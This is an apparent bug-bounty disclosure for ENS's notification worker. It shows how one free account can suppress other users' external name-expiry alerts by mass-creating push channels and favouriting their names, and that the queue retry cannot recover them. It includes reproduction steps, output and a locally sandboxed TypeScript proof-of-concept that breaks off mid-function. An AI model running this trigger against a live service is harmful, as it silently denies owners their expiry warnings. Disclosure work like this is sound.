# 91615 w a medium queues event ingestion ts idempotency key stamped before the delivery fan out

**Submitted on Sep 3rd 2026 at 00:50:18 UTC by @zaaf for** [**Audit Competition | ENS**](https://immunefi.com/audit-competition/audit-competition-ens)

* **Report ID:** #91615
* **Report Type:** Websites & Apps
* **Report severity:** Medium
* **Target:** <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/workers>
* **Impacts:**
  * Changing non-sensitive details of other users (including modifying browser local storage) without already-connected wallet interaction and with up to one click of user interaction, such as: Enabling/disabling notifications

## Description

## Brief/Intro

`processExpiryEvents` in `workers/api-worker/src/queues/event-ingestion.ts` stamps `notifications.idempotency_key` when it inserts the notification rows (`:249-262`), then writes the whole batch's `notification_deliveries` rows afterwards in a single non-transactional statement (`:407-411`). When that later statement raises, the handler calls `message.retry()` (`:601-603`), and the redelivery re-reads zero newly inserted notifications and returns early (`:268-273`), so the delivery rows for that batch are never created, and the `app-api-worker-event-ingestion` consumer is the one producer in `wrangler.jsonc` that declares no `dead_letter_queue`, so nothing catches what was lost. Any authenticated account can raise that statement on demand, for names it does not own, by holding enough `verified` push channels that its own delivery rows carry the batch over PostgreSQL's bind-parameter ceiling: `POST /notifications/channels/push` applies no per-account cap, and `PUT /favorites/:name` makes the caller a recipient of that name's expiry events from the `7d` stage onward.

## Vulnerability Details

**Missing control:** the idempotency key does not cover the step that fails, and nothing bounds the work that step has to do.

**Where:** `workers/api-worker/src/queues/event-ingestion.ts`

* `:249-262` inserts the notifications with `.onConflictDoNothing({ target: notifications.idempotency_key })` and returns the rows it actually inserted.
* `:268-273` `if (insertedNotifications.length === 0) { … return ok(undefined) }`, on a redelivery the conflict makes this list empty, so the function returns before it reaches any delivery work.
* `:322-390` builds `deliveriesToInsert` for the whole batch: one row per (notification, verified channel), six columns each, `id`, `notification_id`, `channel`, `target`, `status`, `attempts`.
* `:407-411` writes all of them in one statement, `db.insert(TABLE.notificationDeliveries).values(deliveriesToInsert)`. There is no chunking here, and no transaction wraps this statement together with the notifications insert above: `grep -rn "db.transaction(\|FOR UPDATE\|DurableObject" --include="*.ts" src/` returns nothing outside test files.
* `:601-603` `for (const { message } of validMessages) message.retry()` is what runs when the result is an error, which sends the batch back through the early return above.
* `wrangler.jsonc:76-81`, the `app-api-worker-event-ingestion` consumer carries `max_batch_size: 50` and `max_retries: 3` and no `dead_letter_queue`. The three delivery consumers beside it (`:55-61`, `:62-68`, `:69-75`) each declare `"dead_letter_queue": "app-api-worker-dlq"`. The fifth consumer, `app-api-worker-dlq` itself (`:82-87`), also declares none, which is expected for a dead-letter queue; the event-ingestion consumer is the only *producer* of deliveries that does.

Two other files supply the reachable trigger:

* `src/app/routes/notifications/channels/push.ts:101-116` inserts the channel with `status: 'verified'` outright. No per-account count exists in the route, and the schema's only constraint on the table is `user_channel_unique UNIQUE("user_id","channel","target")` (`drizzle/0000_vengeful_golden_guardian.sql:114`, `core/database/schema/notifications.ts:73-79`), so distinct endpoints never collide. Its SSRF allow-list at `:12-39` is a prefix test that `https://fcm.googleapis.com/fcm/send/<anything>` satisfies for any suffix.
* `src/app/routes/favorites/index.ts:21-36`, `PUT /favorites/:name` writes the row with no validation and no ownership check, and `event-ingestion.ts:75-106` `collectRecipientsForEvent` then adds every favouriter of a name to that name's event. `services/expiry-discovery/stages.ts:15-29` sets `includeFavorites: true` on the `7d`, `1d` and `expired` stages.

Six columns per row against the PostgreSQL wire protocol's 65 535 bind parameters gives 10 922 rows in one `INSERT`, and that is where the statement fails. The ceiling applies to the batch's **total** delivery rows, not to one account's channels, so other recipients' rows count against it too.

**Discriminating control:** the proof of concept runs the identical code path five times with the attacker holding 1 000, 11 000, 11 000, 11 000 and 2 000 channels. Each pass needs a distinct idempotency key, so the stage or the expiry timestamp moves with it, and the outcome tracks the channel count rather than the stage: `7d` at 1 000 delivers, `1d` and `expired` at 11 000 do not, and `7d` at 2 000 delivers again. It also carries a second, independent arm that removes the size story altogether: a single injected rejection of the `notification_deliveries` insert, with the fault cleared before the redelivery, produces the same end state, against a paired no-fault control on the identical event that creates the delivery row and acks. And it carries the control that proves the run is not manufacturing its result: with the attacker holding 11 000 channels but `favourited_name_expiry` set back to `false`, the owner is delivered normally.

**Excluded-premise check:** the victim performs no action, sees no dialogue and receives no message. No wallet is connected, no signature is requested, no privileged role is held, no third-party system is compromised, and the attacker needs no relationship to the victim, it never learns who the victim is. The attacker's only privileges are those of a session it created for itself.

## Impact Details

**Attacker:** any holder of one session. A session is free. SIWE against `src/app/routes/auth/index.ts` with a keypair generated on the spot, no allow-list, no funds. All three keypairs are generated by the run itself, which logs in over `POST /auth/nonce` and `POST /auth/login`.

**Victim:** the owner of any `.eth` name the attacker favourites, **and every other recipient of every event in the same queue batch**, up to 50 names per batch (`wrangler.jsonc:78`). One batch in the run carries two names: `target.eth`, which the attacker favourited, and `bystander.eth`, which the attacker never named, never favourited and has no relationship to. `select count(*) from favorites where name='bystander.eth'` returns 0 throughout, and its owner's external delivery count does not move.

**What survives this, stated before the rest, because it is the first thing to check.** The in-app notification is **not** affected. The `notifications` row is inserted successfully, `GET /notifications` returns it, and the Manager renders it: `apps/manager/src/features/notifications/data/queries/notifications.ts:17-39` defines the query over `backendClient.notifications.$get`, `features/notifications/inbox/list.tsx:10` consumes it, `features/navigation/Header/notifications/UnreadBadge.tsx:9-20` draws the unread badge from `unreadCountQuery` (`notifications.ts:41-50`), and `routeTree.gen.ts:130-134` registers the `/notifications` route the header links to. That is asserted rather than left to be discovered: after the suppressed batch, `GET /notifications` as the owner returns `200` with both `name-expiry` notifications. What is lost is every **external** delivery (email, push and Telegram), which is the copy the feature exists to send to someone who is not currently in the app, and the copy an expiry warning is for.

**Gain (measured):** in one run, with the two owners' email channels created through the shipped routes and the attacker's preconditions set through the shipped routes:

| arm                 | attacker channels | stage           | owner deliveries | bystander deliveries | queue              |
| ------------------- | ----------------- | --------------- | ---------------- | -------------------- | ------------------ |
| 1, negative control | 1 000             | `7d`            | 1                | 1                    | 2 acked, 0 retried |
| 2                   | 11 000            | `1d`            | 0                | 0                    | 0 acked, 2 retried |
| 3, the redelivery   | 11 000            | `1d`            | 0                | not read             | 2 acked, 0 retried |
| 5                   | 11 000            | `expired`       | 0                | ,                    | 0 acked, 1 retried |
| 6                   | 2 000             | `7d`, fresh key | 1                | ,                    | 1 acked, 0 retried |

Arm 3 is the retry Cloudflare performs: the notification count does not move (6 → 6), the handler returns early, the message is **acked**, and no delivery row is ever created for that event. That arm reads the favourited name's owner only; the untouched owner's count is read in arm 2 and again in the end-state query below, where it still stands at the single delivery arm 1 created. Arm 5 is the next expiry stage, `buildIdempotencyKey` (`:68-73`) includes the stage, so it is a fresh key and a fresh notification, and it fails the same way. Arm 6 reduces the attacker's rows and the next event delivers again, which is what makes the attacker's row count the variable rather than the environment. The precise statement is therefore: **permanently lost for every event already stamped, and recurring for every later event until the attacker's rows are removed.**

The end state of the run, readable from the database afterwards: the favourited name's owner holds **7 notifications and 4 external deliveries**; the untouched name's owner holds **2 notifications and 1 external delivery**.

**Executed end-to-end:** yes, through the shipped routes and the shipped queue handler, against a PostgreSQL loaded with this repository's own `drizzle/*.sql` migrations. No row was written into the database to set the attack up: every precondition on both sides came from an HTTP request. The three accounts are real SIWE logins; both owners' verified email channels come from `POST /notifications/channels/email` followed by `POST /notifications/channels/email/verify`; the attacker's favourite, its notification preference and **all 11 000 of its push channels** are single HTTP requests to the shipped routes, every one of which returned `201` with no rejection. 1 000 of those requests took 4 276 ms in process, and the whole run (bootstrap, 11 000 channel creations, eight arms), completes in about 93 seconds.

**Substituted, and stated plainly:** `getDatabase` returns Drizzle over node-postgres instead of Drizzle over neon-http, wrapped in a Proxy that can reject one specific `insert(notification_deliveries)` for arm 8 and is otherwise transparent; the three queue bindings are in-memory sinks that record what the shipped code enqueued, because Cloudflare Queues bindings do not exist outside workerd; the SendGrid call the email-channel route makes is answered in process, so each owner's verification token is read from the `channel_verifications` row the route just wrote rather than from an inbox; and the batch is handed to `handleEventIngestionQueue` directly, which is what `queues/index.ts:34-36` does for this queue name. A stock `postgres:16` image carries no `pg_uuidv7`, which this repository's own `workers/api-worker/Dockerfile` builds into its image, so the one function the schema needs is supplied in plain SQL when the extension is absent; nothing under test reads a uuid's contents.

**Not executed, and not claimed as severity:** the hourly cron in `services/expiry-discovery/` was not run. The events fed to the consumer are the shape `expiry-discovery/index.ts:39-46` emits for the stages in `stages.ts:15-29`, and the redelivery was performed by hand rather than by Cloudflare Queues.

**Verified out of band:** every count in the table is read back out of PostgreSQL with a `select` after the handler returns, not taken from a response body or a log line.

**Read, not measured.** The 10 922 boundary was measured against PostgreSQL 16 over node-postgres, where 10 921 attacker channels still deliver and 10 922 do not. Production uses Neon's HTTP driver (`drizzle-orm/neon-http`, `@neondatabase/serverless`), which was not tested. The limit lives in the wire protocol's int16 parameter count rather than in the driver, but the number is not claimed for Neon, and the finding does not rest on it. Arm 8 reaches the same end state through a failure that has nothing to do with statement size.

**Where this sits in the impact list.** *"Changing non-sensitive details of other users (including modifying browser local storage) without already-connected wallet interaction and with up to one click of user interaction, such as: Enabling/disabling notifications."* The row allows up to one click from the affected user; this needs none.

**Known Issues.** The exclusion document's only two `workers/api-worker` entries are **R2-05** (SendGrid event webhook fails open when the verification key is unset) and **R2-04** (the Explorer OG-image worker's SSRF); neither touches queues, idempotency, fan-out or channels. **EXP-INPUT-009** is the nearest entry naming notifications and is a different component and a different defect: a Manager push-notification click opening a backend-supplied URL unvalidated. **R3-01…R3-08** are `packages/transaction-manager` state-machine entries. No Part-2 QA entry and no `WEB-*` tracker item names a notification, queue, channel or delivery behaviour.

**Scope.** Cloudflare and Neon are third-party services and are not what is being reported: the defect is in first-party code in a listed asset, and the fix is in first-party code. Nor is this a report about a missing request limit: a per-account channel cap would remove one attacker-reachable trigger and leave the defect, which is why arm 8 exists. `wrangler.jsonc` declares only `kv_namespaces`, `queues`, `vars`, `triggers` and `observability`.

## References

* `workers/api-worker/src/queues/event-ingestion.ts` lines 68-73, 75-106, 249-262, 268-273, 322-390, 407-411, 601-603
* `workers/api-worker/src/app/routes/notifications/channels/push.ts` lines 12-39, 101-116
* `workers/api-worker/src/app/routes/favorites/index.ts` lines 21-36
* `workers/api-worker/src/app/routes/notifications/preferences.ts` lines 62-120, the `PATCH` handler
* `workers/api-worker/src/services/expiry-discovery/stages.ts` lines 9-30
* `workers/api-worker/src/core/database/schema/notifications.ts` lines 73-79, the only constraint on `user_channels`, and lines 143-147, where `favourited_name_expiry` defaults to `false`
* `workers/api-worker/wrangler.jsonc` lines 54-88, all five queue consumers side by side
* `apps/manager/src/features/notifications/data/queries/notifications.ts` lines 17-39 and 41-50
* `apps/manager/src/features/notifications/inbox/list.tsx` line 10
* `apps/manager/src/features/navigation/Header/notifications/UnreadBadge.tsx` lines 9-20
* `apps/manager/src/routeTree.gen.ts` lines 130-134

## Proof of Concept

## Proof of Concept

`workers/api-worker/src/poc/expiry-delivery-fanout.poc.ts`, reproduced in full at the end of this section, with its pinned output in `EXPECTED_expiry-delivery-fanout.txt`. One command runs every arm and prints one `PASS` line per load-bearing claim, including the negative control, the injected-fault control, the assertion that the in-app notification survives, and the network boundary.

### Prerequisites

Two local services, and nothing else. Neither contacts a public network.

```
docker run -d --name poc-pg -p 55432:5432 -e POSTGRES_PASSWORD=postgres postgres:16
anvil --port 8545 --silent
```

Its own database (`ens_cf4_poc`) is created on that instance and loaded with this repository's own migrations from `workers/api-worker/drizzle`, so no existing database is read or written. The node is touched only by the shipped SIWE verification path, which runs one `eth_call`, so a plain `anvil` with no fork and no upstream is enough, the run was repeated against one (chain id 31337) and the `PASS` output was byte-identical. Both services are overridable with `CF4_ADMIN_PG_URL`, `CF4_PG_DB` and `CF4_RPC_URL`.

`globalThis.fetch` is replaced for the whole run: `127.0.0.1` is forwarded to the local node, the two provider hosts the shipped code calls are answered in process and counted, and every other host throws before dispatch. That boundary's own tally is the last `PASS` line, so a stray request cannot pass silently.

### Reproduction

```
cd workers/api-worker
./node_modules/.bin/vitest run --config vitest.poc.config.ts \
  --silent=false --disableConsoleIntercept src/poc/expiry-delivery-fanout.poc.ts
```

Steps 1 to 14 all happen inside that single run, in this order; step 15 is read afterwards. Each names who performs it and carries the command that shows it. Run the command once into a file first:

```
./node_modules/.bin/vitest run --config vitest.poc.config.ts \
  --silent=false --disableConsoleIntercept src/poc/expiry-delivery-fanout.poc.ts > poc.log 2>&1
```

1. **As the attacker and as each of the two owners, three separate free sessions:** `POST /auth/nonce` then `POST /auth/login` with a SIWE message signed by a keypair the run generates itself; read back with `psql postgres://postgres:postgres@127.0.0.1:55432/ens_cf4_poc -tAc "select count(*) from users"` → `3`
2. **As each owner, an ordinary user setting notifications up:** `POST /notifications/channels/email`, then `POST /notifications/channels/email/verify` with the token the first call wrote, then `PATCH /notifications/preferences {"ownedNameExpiry":true}`; read back with `psql postgres://postgres:postgres@127.0.0.1:55432/ens_cf4_poc -tAc "select count(*) from user_channels where channel='email' and status='verified'"` → `2`
3. **As the attacker, becoming a recipient of a name it does not own:** `PUT /favorites/target.eth` → `200`; read back with `psql postgres://postgres:postgres@127.0.0.1:55432/ens_cf4_poc -tAc "select name from favorites"` → `target.eth`, and the same query for `bystander.eth` returns nothing
4. **As the attacker, enabling its own delivery for favourited names:** `PATCH /notifications/preferences {"favouritedNameExpiry":true}` → `200`; see it with `grep 'favourited-name delivery' poc.log`
5. **As the attacker, creating 1 000 verified push channels:** 1 000 × `POST /notifications/channels/push` with endpoint `https://fcm.googleapis.com/fcm/send/poc-<i>`; see it with `grep 'POST /notifications/channels/push in' poc.log` → `statuses [201], channels held 1000`
6. **As the expiry cron, carrying two names into one batch:** `handleEventIngestionQueue` with `target.eth` (owner 1) and `bystander.eth` (owner 2) at stage `7d`; see it with `grep '^\[arm 1' poc.log` → `owner=1 bystander=1 emailJobs=2 retried=0 acked=2`
7. **As the attacker, going from 1 000 to 11 000 channels:** 10 000 further single `POST /notifications/channels/push` requests; see it with `grep 'attacker now holds' poc.log` → `11000 verified push channels; statuses seen across all 11000 requests [201]`
8. **As the expiry cron, the same two names one stage later:** `handleEventIngestionQueue` with both names at stage `1d`; see it with `grep '^\[arm 2' poc.log` → `owner=0 bystander=0 emailJobs=0 retried=2 acked=0`
9. **As Cloudflare Queues, redelivering the batch the handler asked to retry:** the same two events with `attempts: 1`; see it with `grep '^\[arm 3' poc.log` → `notifications 6 -> 6, owner deliveries=0, retried=0 acked=2`
10. **As the first owner, opening the notification centre:** `GET /notifications` with that owner's bearer token; see it with `grep '^\[arm 4' poc.log` → `-> 200, kinds ["name-expiry","name-expiry"]`
11. **As the expiry cron, the `expired` stage for the same name, a fresh idempotency key:** `handleEventIngestionQueue` once more; see it with `grep '^\[arm 5' poc.log` → `owner deliveries=0, retried=1`
12. **As the attacker, dropping back to 2 000 channels, then the cron with a fresh event:** the run removes 9 000 of the attacker's own channel rows with a direct `delete from user_channels` rather than through `DELETE /notifications/channels/:id` (`channels/$id.ts:62-78`), because this arm is a control on the count and not a claim about that route, then `handleEventIngestionQueue`; see it with `grep '^\[arm 6' poc.log` → `reduced to 2000; fresh key -> owner deliveries=1, retried=0 acked=1`
13. **As the attacker, back at 11 000 channels through the route again but with its own opt-in off, the control that proves the run measures the attack:** `PATCH /notifications/preferences {"favouritedNameExpiry":false}` then the cron; see it with `grep '^\[arm 7' poc.log` → `back to 11000 channels but favourited_name_expiry=false -> owner deliveries=1, retried=0`
14. **As a failing database, with no attacker and no size limit involved:** one rejected `insert(notification_deliveries)`, the fault cleared, then the redelivery, beside a paired no-fault control on the identical event; see it with `grep '^\[arm 8' poc.log` → `pass 1 fault on: owner deliveries=0 retried=1 acked=0; pass 2 fault off, redelivered: owner deliveries=0 retried=0 acked=1; control no fault: owner deliveries=1 retried=0`
15. **As the reviewer, reading the end state out of the database rather than out of the log:** `psql postgres://postgres:postgres@127.0.0.1:55432/ens_cf4_poc -tAc "select target, count(*) from notification_deliveries where target like '%@example.invalid' group by target order by target"` → `bystander@example.invalid|1` and `owner@example.invalid|4`, against 2 and 7 rows in `notifications` for those same two users

### Observed output

```
database ens_cf4_poc rebuilt from 5 migration files (0000_vengeful_golden_guardian.sql, 0001_material_talkback.sql, 0002_ambiguous_marvel_apes.sql, 0003_condemned_landau.sql, 0004_add_transactions.sql), 10 tables, uuid source: pgcrypto shim for uuid_generate_v7()
node http://127.0.0.1:8545 used only by the shipped SIWE verification path

1000 POST /notifications/channels/push in 4276 ms, statuses [201], channels held 1000
[arm 1 control  1000 channels, stage 7d] owner=1 bystander=1 emailJobs=2 retried=0 acked=2
attacker now holds 11000 verified push channels; statuses seen across all 11000 requests [201]
[arm 2 test     11000 channels, stage 1d] owner=0 bystander=0 emailJobs=0 retried=2 acked=0
[arm 3 retry] notifications 6 -> 6, owner deliveries=0, retried=0 acked=2
[arm 4 in-app] GET /notifications as the owner -> 200, kinds ["name-expiry","name-expiry"]
[arm 5 recurrence] stage expired, fresh idempotency key -> owner deliveries=0, retried=1; keys ["1d:1788741563","7d:1788741563","expired:1788741563"]
[arm 6 restore] attacker channels reduced to 2000; fresh key -> owner deliveries=1, retried=0 acked=1
[arm 7 opt-out control] attacker back to 11000 channels but favourited_name_expiry=false -> owner deliveries=1, retried=0
[arm 8 fault] pass 1 fault on: owner deliveries=0 retried=1 acked=0; pass 2 fault off, redelivered: owner deliveries=0 retried=0 acked=1; control no fault: owner deliveries=1 retried=0

outbound: 7 requests, hosts ["127.0.0.1","api.sendgrid.com"], answered in process 4, refused 0

PASS a session costs nothing: SIWE over the shipped auth routes issues a bearer token :: three self-generated keypairs, POST /auth/nonce + POST /auth/login -> 200, no funds, no allow-list
PASS both owners hold a verified email channel created through the shipped routes :: POST /notifications/channels/email -> 200, POST /notifications/channels/email/verify -> 200, two verified rows
PASS the attacker becomes a recipient of a name it does not own :: PUT /favorites/target.eth -> 200, no ownership check on the route
PASS the attacker enables its own favourited-name delivery through the shipped route :: PATCH /notifications/preferences {favouritedNameExpiry:true} -> 200, one request
PASS negative control below the ceiling: every recipient in the batch is delivered :: 1000 attacker channels, stage 7d, owner deliveries=1, bystander deliveries=1, retries=0
PASS POST /notifications/channels/push applies no per-account cap :: 11000 consecutive requests, every one 201, no rejection, no cap in the route or the schema
PASS above the ceiling the whole batch loses every external delivery :: stage 1d, no new delivery row for either owner, no queue job, both messages retried
PASS the loss reaches an owner the attacker never touched :: favorites rows for bystander.eth = 0, and its owner's delivery count did not move
PASS the retry cannot repair it: the idempotency key was already stamped :: redelivery inserts zero new notifications, returns early and acks; deliveries stay lost
PASS the in-app notification survives and is served to the owner :: GET /notifications -> 200 with both name-expiry notifications; only the external copies are lost
PASS a later expiry stage has a fresh idempotency key and fails the same way :: stages 7d, 1d and expired all stamped; the two above the ceiling produced no delivery
PASS the attacker's row count is the variable, not the environment :: channels reduced to 2000, the next event delivers to the owner again
PASS the attacker's own opt-in is load-bearing, so the arms above measure the attack :: 11000 channels with favourited_name_expiry=false contribute zero delivery rows
PASS the same unrecoverable end state follows from a failure that is not a size limit :: one rejected deliveries insert, fault cleared, redelivery returns early and acks; deliveries never created
PASS paired control for the injected fault :: the identical event with no fault creates the delivery row and acks
PASS network boundary: the only requests that left the process went to 127.0.0.1 :: the provider calls the shipped code made were answered in process and counted; every other host throws before dispatch

 Test Files  1 passed (1)
      Tests  1 passed (1)
   Duration  93.02s
```

The `PASS` lines are byte-stable across runs, four runs, each on a database created for it and one of them against a plain non-forking node, produced identical text, and are pinned in the included below `EXPECTED_expiry-delivery-fanout.txt`, so the run can be checked with `cmp` rather than read:

```
./node_modules/.bin/vitest run --config vitest.poc.config.ts \
  --silent=false --disableConsoleIntercept src/poc/expiry-delivery-fanout.poc.ts 2>&1 \
  | grep -E '^(PASS|FAIL)' | cmp - src/poc/EXPECTED_expiry-delivery-fanout.txt
```

The varying numbers (request timings, uuids, the epoch second in the idempotency keys), are printed in the lines above the assertions and deliberately kept out of the `PASS` lines, because a `PASS` line that varies cannot be diffed. `uuid source` reads `pg_uuidv7 extension` instead of `pgcrypto shim for uuid_generate_v7()` when the Postgres image built by this repository's own `workers/api-worker/Dockerfile` is used; the `PASS` lines are the same either way.

### The boundary measurement, separately

The exact 10 922 threshold comes from a sweep one row either side of it, run against the same code and the same PostgreSQL:

```
attacker push channels =  10000 -> deliveries created =  10001  retried = 0  victim notified = true
attacker push channels =  10900 -> deliveries created =  10901  retried = 0  victim notified = true
attacker push channels =  10921 -> deliveries created =  10922  retried = 0  victim notified = true
attacker push channels =  10922 -> deliveries created =      0  retried = 1  victim notified = false
attacker push channels =  11000 -> deliveries created =      0  retried = 1  victim notified = false
```

65 535 bind parameters divided by six columns per delivery row is 10 922, which is where it flips. This is the arm whose number is not claimed for Neon.

### Recommendation

Move the idempotency stamp so that it covers the work it is supposed to make idempotent: either wrap the notifications insert and the delivery fan-out in one transaction, or write the deliveries first and stamp afterwards, so that a failure leaves the batch genuinely un-processed and the retry can complete it. Chunk `:407-411` the way the queue sends beneath it are already chunked, `chunk(jobs, QUEUE_BATCH_SIZE)` at `:421`, with `QUEUE_BATCH_SIZE = 95` at `:20`, so that batch size cannot decide whether the statement succeeds. Give the `app-api-worker-event-ingestion` consumer a `dead_letter_queue`, as its three siblings in the same file already have, so that a batch which exhausts its retries is visible instead of dropped. Independently, bound `user_channels` per account in `push.ts`, which removes the trigger demonstrated here.

### The proof of concept in full

Immunefi's attachment field accepts images only, so the source is reproduced here rather than attached. Save it as `workers/api-worker/src/poc/expiry-delivery-fanout.poc.ts` and run the command above.

```ts
/**
 * Proof of concept — one authenticated account makes `workers/api-worker` lose every external
 * notification delivery for a whole event-ingestion batch, including for owners it has no
 * relationship to, and the queue retry cannot repair it.
 *
 * Run (one command, from workers/api-worker; dependencies are already installed):
 *
 *   ./node_modules/.bin/vitest run --config vitest.poc.config.ts \
 *     --silent=false --disableConsoleIntercept src/poc/expiry-delivery-fanout.poc.ts
 *
 * Requires two local services and nothing else:
 *   - PostgreSQL at CF4_ADMIN_PG_URL (default postgres://postgres:postgres@127.0.0.1:55432/postgres).
 *     This file creates its own database (default `ens_cf4_poc`) and loads this repository's own
 *     migrations from workers/api-worker/drizzle into it, so no existing database is touched.
 *   - an EVM node at CF4_RPC_URL (default http://127.0.0.1:8545), used only by the shipped SIWE
 *     login path, which runs one eth_call against it. A plain `anvil --port 8545 --silent` with no
 *     fork and no upstream is enough, so nothing here contacts a public network.
 *
 * Network boundary, enforced rather than promised: `globalThis.fetch` is replaced for the whole run.
 * Requests to 127.0.0.1 are forwarded to the local node; the two provider hosts the shipped code
 * calls (api.sendgrid.com, fcm.googleapis.com) are answered in process and counted; every other host
 * throws before dispatch. The last PASS line reports what that boundary saw.
 *
 * Substitutions, all declared:
 *   - `getDatabase` returns drizzle over node-postgres instead of drizzle over neon-http, wrapped in
 *     a Proxy that can reject one specific `insert(notification_deliveries)` on demand (arm 8).
 *     Every route handler, middleware, Drizzle query and queue handler is shipped code.
 *   - EMAIL_QUEUE / PUSH_QUEUE / TELEGRAM_QUEUE are in-memory sinks that record what the shipped
 *     code enqueued. Cloudflare Queues bindings do not exist outside workerd.
 *   - The queue batch is handed to `handleEventIngestionQueue` directly. `queues/index.ts:34-36` is
 *     the only caller for the queue name `app-api-worker-event-ingestion`.
 *   - The hourly expiry cron is not run; the events fed in are the shape
 *     `services/expiry-discovery/index.ts:39-46` emits for the stages in `stages.ts:15-29`.
 */
import { readdirSync, readFileSync } from 'node:fs'
import path from 'node:path'
import { fileURLToPath } from 'node:url'
import { drizzle } from 'drizzle-orm/node-postgres'
import { Client, Pool } from 'pg'
import { createSiweMessage } from 'viem/siwe'
import { generatePrivateKey, privateKeyToAccount } from 'viem/accounts'
import { afterAll, beforeAll, describe, expect, it, vi } from 'vitest'
import * as schema from '#core/database/schema/index.js'

// ---------------------------------------------------------------- configuration
const ADMIN_URL =
  process.env.CF4_ADMIN_PG_URL ??
  'postgres://postgres:postgres@127.0.0.1:55432/postgres'
const DB_NAME = process.env.CF4_PG_DB ?? 'ens_cf4_poc'
const POC_URL = ADMIN_URL.replace(/\/[^/]*$/, `/${DB_NAME}`)
const RPC_URL = process.env.CF4_RPC_URL ?? 'http://127.0.0.1:8545'
const MIGRATIONS = path.resolve(
  path.dirname(fileURLToPath(import.meta.url)),
  '../../drizzle',
)

/** Attacker channel counts. The ceiling is on the batch's TOTAL delivery rows. */
const BELOW = 1_000
const ABOVE = 11_000
const REDUCED = 2_000

const NAME_FAVOURITED = 'target.eth'
const NAME_UNTOUCHED = 'bystander.eth'

// ---------------------------------------------------------------- network boundary
type Outbound = { url: string; answered: 'loopback' | 'in-process' | 'refused' }
const outbound: Outbound[] = []
const realFetch = globalThis.fetch

globalThis.fetch = (async (input: RequestInfo | URL, init?: RequestInit) => {
  const url = typeof input === 'string' ? input : input.toString()
  const host = (() => {
    try {
      return new URL(url).hostname
    } catch {
      return ''
    }
  })()
  if (host === '127.0.0.1' || host === 'localhost') {
    outbound.push({ url, answered: 'loopback' })
    return realFetch(input as RequestInfo, init)
  }
  if (host === 'api.sendgrid.com') {
    outbound.push({ url, answered: 'in-process' })
    return new Response(null, { status: 202 })
  }
  if (host === 'fcm.googleapis.com') {
    outbound.push({ url, answered: 'in-process' })
    return new Response(null, { status: 201 })
  }
  outbound.push({ url, answered: 'refused' })
  throw new Error(`poc proof of concept refused a non-loopback request to ${url}`)
}) as typeof fetch

// ---------------------------------------------------------------- database
const pool = new Pool({ connectionString: POC_URL, max: 20 })
const realDb = drizzle(pool, { schema })

/** Arm 8 only. Off unless the arm turns it on; the arm turns it off again. */
const fault = { failDeliveryInsert: false }

vi.mock('#core/database/index.js', async (importOriginal) => {
  const original = await importOriginal<Record<string, unknown>>()
  return {
    ...original,
    getDatabase: () =>
      new Proxy(realDb as Record<string, unknown>, {
        get(target, prop, recv) {
          if (prop === 'insert') {
            return (table: unknown) => {
              const name = (table as Record<symbol, unknown>)?.[
                Symbol.for('drizzle:Name')
              ]
              if (fault.failDeliveryInsert && name === 'notification_deliveries') {
                // A real database failure surfaces as a rejected promise, which is how the
                // shipped `intoDbResult(...)` wrapper observes it. A synchronous throw would
                // take a different path and would not model the defect.
                return {
                  values: () =>
                    Promise.reject(
                      new Error('poc injected fault: deliveries insert failed'),
                    ),
                }
              }
              return (target as { insert: (t: unknown) => unknown }).insert(table)
            }
          }
          return Reflect.get(target, prop, recv)
        },
      }),
  }
})

const { handleEventIngestionQueue } = await import('#queues/event-ingestion.js')
const { default: app } = await import('#app/index.js')

// ---------------------------------------------------------------- worker environment
type Sink = { body: unknown }
let pushJobs: Sink[] = []
let emailJobs: Sink[] = []
const sink = (into: Sink[]) => ({
  send: async (body: unknown) => {
    into.push({ body })
  },
  sendBatch: async (msgs: Array<{ body: unknown }>) => {
    for (const m of msgs) into.push({ body: m.body })
  },
})

const kv = new Map<string, string>()
const env = {
  DATABASE_URL: POC_URL,
  JWT_SECRET: 'poc-proof-of-concept-secret',
  CHAIN: 'sepolia',
  SEPOLIA_RPC_URL: RPC_URL,
  MANAGER_APP_URL: 'https://app.ens.dev',
  EMAIL_FROM_ADDRESS: 'noreply@example.invalid',
  SENDGRID_API_KEY: 'SG.poc-proof-of-concept-not-a-real-key',
  VAPID_SUBJECT: 'mailto:noreply@example.invalid',
  VAPID_PUBLIC_KEY: '',
  VAPID_PRIVATE_KEY: '',
  KV: {
    async get(k: string) {
      return kv.get(k) ?? null
    },
    async put(k: string, v: string) {
      kv.set(k, v)
    },
    async delete(k: string) {
      kv.delete(k)
    },
  },
  get EMAIL_QUEUE() {
    return sink(emailJobs)
  },
  get PUSH_QUEUE() {
    return sink(pushJobs)
  },
  get TELEGRAM_QUEUE() {
    return sink([])
  },
} as unknown as CloudflareBindings

const ctx = {
  waitUntil: () => {},
  passThroughOnException: () => {},
} as unknown as ExecutionContext

// ---------------------------------------------------------------- helpers
const req = (p: string, init: RequestInit = {}) => app.request(p, init, env, ctx)
const auth = (token: string) => ({
  'Content-Type': 'application/json',
  Authorization: `Bearer ${token}`,
})

const n = async (sql: string, params: unknown[] = []) =>
  Number((await pool.query<{ n: string }>(sql, params)).rows[0]?.n ?? 0)

const externalDeliveries = (target: string) =>
  n('select count(*)::int as n from notification_deliveries where target=$1', [
    target,
  ])

const pass = (name: string, ok: boolean, detail: string) => {
  console.log(`${ok ? 'PASS' : 'FAIL'} ${name} :: ${detail}`)
  expect(ok, name).toBe(true)
}

/** A free session over the shipped /auth routes: nonce, SIWE message, signature, bearer token. */
async function siweLogin() {
  const account = privateKeyToAccount(generatePrivateKey())
  const nonceRes = await req('/auth/nonce', { method: 'POST' })
  const { nonce } = (await nonceRes.json()) as { nonce: string }
  const message = createSiweMessage({
    address: account.address,
    chainId: 11_155_111,
    domain: 'app.ens.dev',
    nonce,
    uri: 'https://app.ens.dev',
    version: '1',
  })
  const signature = await account.signMessage({ message })
  const loginRes = await req('/auth/login', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      address: account.address,
      message,
      signature,
      nonce,
    }),
  })
  const body = (await loginRes.json()) as { token?: string }
  if (!body.token) {
    throw new Error(
      `SIWE login failed: ${loginRes.status} ${JSON.stringify(body)}`,
    )
  }
  const id = await pool.query<{ id: string }>(
    'select id from users where address=$1',
    [account.address.toLowerCase()],
  )
  return {
    address: account.address,
    token: body.token,
    id: id.rows[0]?.id as string,
    loginStatus: loginRes.status,
  }
}

/** A verified email channel through the shipped routes, exactly as a real user gets one. */
async function verifiedEmailChannel(token: string, email: string) {
  const add = await req('/notifications/channels/email', {
    method: 'POST',
    headers: auth(token),
    body: JSON.stringify({ email }),
  })
